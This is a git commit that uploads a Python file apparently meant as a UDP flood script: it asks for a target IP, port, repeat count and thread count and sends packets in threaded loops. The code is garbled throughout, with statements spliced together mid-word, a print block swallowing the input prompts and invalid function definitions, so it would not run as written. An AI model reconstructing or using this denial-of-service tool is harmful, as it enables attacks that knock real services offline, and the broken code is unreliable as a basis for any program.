df193b84919f00420ace21541e39949a6ef8253f
Saepuloh-debug <85790539+Saepuloh-debug@users.noreply.github.com>
2021-11-12 11:43:43 +0000

    Add files via upload

---
+++ haha.py.py
@@ -0,0 +1,24 @@
+import 
+print("""t socket
+import random
+import threading
+
+print("""
+      \033[93m
+<< CIH RENAME SOK ASIX >>
+                  
+                  ip = str(input("IP TARGET:"))
+port = int(input("PORT TARGET:"))
+times = int(input("Times:"))
+threads = int(input("threads:"))""""")
+def rutry:
+s = socket.socket(socket.AF_INEle True:
+try:
+s = socket.socket(socket.AF_INET, sofor x in range(times):
+s.sendto(data,addr)
+for x in range(times):
+s.sendto(data,addr)
+# Threads
+for y in range(threads):
+th = threading.Thread(target = wt)
+th.start()
